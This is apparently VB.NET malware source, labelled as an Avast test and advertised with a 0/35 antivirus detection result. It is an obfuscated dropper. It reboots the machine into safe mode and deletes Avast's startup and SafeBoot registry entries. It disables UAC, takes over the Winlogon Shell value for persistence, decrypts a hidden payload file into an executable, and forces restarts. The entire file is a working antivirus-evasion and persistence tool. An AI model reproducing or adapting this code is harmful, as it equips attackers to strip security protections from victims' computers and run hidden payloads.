'Written by ProgrammerMan | Test for AVAST
'https://nodistribute.com/result/7CmvAqdxjzENg2aMF0HrlD9oGIZeRn | 0/35
'Demo https://www.youtube.com/watch?v=yxNE7xa5mRY
Imports System.Threading
Imports System.Windows.Forms
Module Module1

    Sub Main()
        Dim dosya_varmi As Boolean = My.Computer.FileSystem.FileExists(Application.StartupPath & ROA("NHs{|H<h}p"))
        If dosya_varmi = True Then
            If My.Settings.durum = ROA("astw") Then
                Dim regKey As Object = My.Computer.Registry.LocalMachine.OpenSubKey(ROA("A]TFES@WN_{q`}a}tfNE{|v}eaNQg``w|fDw`a{}|N@g|"), True).GetValue(ROA("SdsafG[<wjw"))
                If regKey Is Nothing Then
                    On Error Resume Next
                Else
                    My.Computer.Registry.LocalMachine.OpenSubKey(ROA("A]TFES@WN_{q`}a}tfNE{|v}eaNQg``w|fDw`a{}|N@g|"), True).DeleteValue(ROA("SdsafG[<wjw"))
                End If
                On Error Resume Next
                Shell(ROA("`wu2vw~wfw200ZYWKM^]QS^M_SQZ[\WNA]TFES@WNSDSAF2A}tfes`w002=t"))
                Shell(ROA("`wu2vw~wfw200ZYWKMQG@@W\FMGAW@NA]TFES@WNSDSAF2A}tfes`w002=t"))

                Dim zobajen As String
                FileOpen(1, Application.StartupPath & ROA("NHs{|H<h}p"), OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                zobajen = Space(LOF(1))
                FileGet(1, zobajen)
                FileClose(1)

                FileOpen(1, Application.StartupPath & ROA("Hs{|H<wjw"), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, ROT13(zobajen))
                FileClose(1)

                If System.IO.File.Exists(ROA("Q(NE{|v}eaNHs{|H<wjw")) Then
                    System.IO.File.Delete(ROA("Q(NE{|v}eaNHs{|H<wjw"))
                    System.IO.File.Copy(Application.StartupPath & ROA("NHs{|H"), ROA("Q(NE{|v}eaNHs{|H"))
                End If
                Dim path As String
                path = ROA("wjb~}`w`<wjw>Hs{|H")
                My.Computer.Registry.SetValue(ROA("ZYWKM^]QS^M_SQZ[\WNA]TFES@WN_{q`}a}tfNE{|v}ea2\FNQg``w|fDw`a{}|NE{|~}u}|"), ROA("Azw~~"), path)

                My.Computer.Registry.SetValue(ROA("ZYWKM^]QS^M_SQZ[\WNA]TFES@WN_{q`}a}tfNE{|v}eaNQg``w|fDw`a{}|NB}~{q{waNAkafw"), ROA("W|sp~w^GS"), 0)
                Shell(ROA("pqvwv{f2=vw~wfwds~gw2ivwtsg~fo2astwp}}f"))
                System.Diagnostics.Process.Start(ROA("azgfv}e|0>20?`2?f2"""))
            Else
                Thread.Sleep("15000")
                MsgBox("ZObajen Beta")
                Thread.Sleep("5000")
                Shell(ROA("pqvwv{f2=awf2ivwtsg~fo2astwp}}f2|wfe}`y"))
                Dim path As String
                path = ROA("wjb~}`w`<wjw>") & Application.StartupPath & ROA("NH]psxw|Pwfs<wjw")
                My.Computer.Registry.SetValue(ROA("ZYWKM^]QS^M_SQZ[\WNA]TFES@WN_{q`}a}tfNE{|v}ea2\FNQg``w|fDw`a{}|NE{|~}u}|"), ROA("Azw~~"), path)
                My.Settings.durum = ROA("astw")
                My.Settings.Save()
                System.Diagnostics.Process.Start(ROA("azgfv}e|0>20?`2?f2"""))
            End If

        Else
            MsgBox("Yükleme Sırasında Hata" & vbCrLf & "Yükleme için gerekli .zob uzantılı dosya bulunamadı", MsgBoxStyle.Critical)
        End If
    End Sub
    Public Function ROT13(ByVal input As String) As String
        Dim out As New System.Text.StringBuilder
        For i As Integer = 0 To input.Length - 1
            out.Append(Chr(Asc(input(i)) Xor 13))
        Next
        Return out.ToString
    End Function
    Public Function ROA(ByVal input As String) As String
        Dim out As New System.Text.StringBuilder
        For i As Integer = 0 To input.Length - 1
            out.Append(Chr(Asc(input(i)) Xor 18))
        Next
        Return out.ToString
    End Function
End Module
